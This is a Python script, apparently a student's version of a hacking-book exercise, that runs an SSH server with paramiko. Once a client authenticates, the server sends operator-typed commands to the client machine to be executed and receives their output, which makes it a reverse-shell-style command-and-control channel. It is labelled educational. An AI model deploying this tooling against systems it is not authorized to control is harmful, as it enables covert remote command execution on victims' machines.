#!/usr/bin/env python3

'''
How to use ***FOR TESTING AND EDUCATIONAL PURPOSES ONLY*** (instructions in the book weren't very clear):
    - put this on a machine that has python, openssh and paramiko installed, (this will be the server machine)
    - on the server machine, generate an rsa key file 
        -- make sure there's a .ssh file in $HOME, if not, try ssh'ing to localhost (or sshing remotely) and ensuring that the ssh server is up
        -- paramiko uses OpenSSH, which requires a specific opening line in the RSA key, so in order to make it the right format, use the command 'ssh-keygen -m PEM' 
    - on the client machine, make sure that bh_sshRcmd.py has the ip address, username, and password of the server machine
    - start this script on the server machine, give it '[ip address of serer machine] 22 /path/to/rsa/key/' for arguments when running (run as sudo or you won't have permission)
        -- before starting, make sure to stop the ssh service with 'sudo service ssh stop' so that way the ip address isn't taken
    - run bh_sshRcmd.py on the client machine, give it '[ssh server machine's ip] [name of server machine user] [password of server machine user]' for arguments when running
'''

import socket
import paramiko
import threading
import sys

# using the PEM generated RSA key
keypath = sys.argv[3] # added an arugment for the path since it would be annoying have to keep manually changing the code every time
host_key = paramiko.RSAKey(filename = keypath)

# we 'SSHinize' the socket listener created below
class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
    
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    
    def check_auth_password(self, username, password):
        if username == '[user]' and password == '[user-password]':
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

server = sys.argv[1]
ssh_port = int(sys.argv[2])

# Creating a socket listener, just like we did earlier in the chapter
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((server, ssh_port))
    sock.listen(100)
    print('[+] Listening for connection...')
    client, addr = sock.accept()

except Exception as e:
    print('[-] Listen failed: ' + str(e))
    sys.exit(1)
print('[+] Got a connection!')

# Configure authentication methods
try:
    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(host_key)
    server = Server()

    try:
        bhSession.start_server(server = server)

    except paramiko.SSHException:
        print('[-] SSH negotiation failed.')
    
    chan = bhSession.accept(20)

    # When a client has been authenticated, send the welcome banner
    print('[+] Authenticated!')
    print(chan.recv(1024).decode())
    chan.send('Welcome to bh_ssh')

    # When the authenticated client sends us the 'ClientConnected' message, any command that is typed into bh_sshserver (this program)
    # is sent to the bh_sshclient(i.e. bh_sshRcmd.py) and executed on it, the output of said command is sent to bh_sshserver
    while True:
        try:
            command = input('Enter command: ').strip('\n')
            if command != 'exit':
                chan.send(command)
                print(chan.recv(1024).decode(errors = 'ignore') + '\n')
            else:
                chan.send('exit')
                print('Exiting...')
                bhSession.close()
                raise Exception('exit')

        except KeyboardInterrupt:
            bhSession.close()

        except Exception as e:
            print('[-] Caught exception: ' + str(e))
            bhSession.close()
    
finally:
    sys.exit(1)